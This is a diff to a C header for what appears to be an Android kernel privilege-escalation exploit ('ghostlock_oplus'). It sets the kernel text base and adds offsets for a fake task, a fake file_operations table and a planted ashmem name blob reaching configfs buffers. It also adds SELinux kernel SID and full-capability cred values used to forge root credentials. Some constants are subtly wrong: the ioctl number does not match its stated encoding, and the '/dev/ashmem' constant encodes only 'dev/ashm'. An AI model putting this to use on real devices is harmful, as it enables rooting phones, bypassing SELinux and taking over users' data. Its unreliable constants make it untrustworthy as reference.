@@ -3,8 +3,10 @@
 
 #define BUILD_VARIANT_LABEL "ghostlock_oplus"
 
-/* Kernel address layout. */
-#define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
+/* Kernel address layout. _text on every supported image (kallsyms-verified
+ * houji; the old 0xffffffc080000000 was wrong but cancelled out in
+ * alias math — the cfi text pointers below need the true base). */
+#define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define MTK_VADDR_BASE 0xffffffc000000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
@@ -108,10 +110,47 @@
  * MAIN_TCP_PAYLOAD): chunk bias 0xe80 and delta 0 live in util.c; these
  * are the in-chunk offsets that differ from the pselect layout.
  * fake_task 0x5800 is the rmp-proven value (avoids the fake_lock
- * rb_leftmost misalignment). CRED copy moved past it — the pselect
- * 0x1080 slot lands inside the fake_task zone once the chunk bias
- * shifts by 0xe80. */
+ * rb_leftmost misalignment). */
 #define TCP_FAKE_TASK_OFF 0x5800
-#define TCP_CRED_COPY_OFF 0x6800
+#define TCP_LOCK_OFF 0x1350
+#define TCP_W0_OFF 0x2220
+#define TCP_SCRATCH_OFF 0x3000
+#define TCP_FAKE_FOPS_OFF 0x3338
+
+/* cfi/configfs write layer symbol fallbacks: 0 = entry has no values,
+ * tcp route disabled at runtime (pselect fallback). */
+#define NOOP_LLSEEK_OFF 0ULL
+#define CONFIGFS_READ_ITER_OFF 0ULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0ULL
+#define ASHMEM_IOCTL_OFF 0ULL
+#define ASHMEM_FOPS_OFF 0ULL
+#define ASHMEM_MISC_FOPS_OFF 0ULL
+
+/* struct file_operations slots the fake table fills; 6.1 layout. */
+#define FOPS_OWNER_OFF 0x00
+#define FOPS_LLSEEK_OFF 0x08
+#define FOPS_READ_ITER_OFF 0x20
+#define FOPS_WRITE_ITER_OFF 0x28
+#define FOPS_IOCTL_OFF 0x50
+
+/* configfs_buffer fields reachable through the planted ashmem name blob
+ * (rmp CFG_* offsets; name prefix is 11 bytes into the same buffer). */
+#define CFG_PAGE_OFF 16
+#define CFG_NEEDS_READ_FILL_OFF 80
+#define CFG_BIN_BUFFER_OFF 88
+#define CFG_BIN_BUFFER_SIZE_OFF 96
+#define CFG_CB_MAX_SIZE_OFF 100
+
+/* ashmem uapi (bionic linux/ashmem.h): ASHMEM_SET_NAME = _IOW(0x77,1,char[256]). */
+#define __ASHMEMIOC 0x77
+#define ASHMEM_NAME_LEN 256
+#define ASHMEM_SET_NAME 0x40774100u
+#define ASHMEM_NAME_PREFIX_LEN 11
+#define ASHMEM_PREFIX_COUNT 0x6d6873612f766564ULL /* "/dev/ashmem" */
+
+#define SELINUX_KERNEL_SID 1
+#define CAP_FULL 0x000001ffffffffffULL
+#define CRED_CAP_WORDS 5
+#define TCP_FAKE_WAITER_PRIO 130
 
 #endif
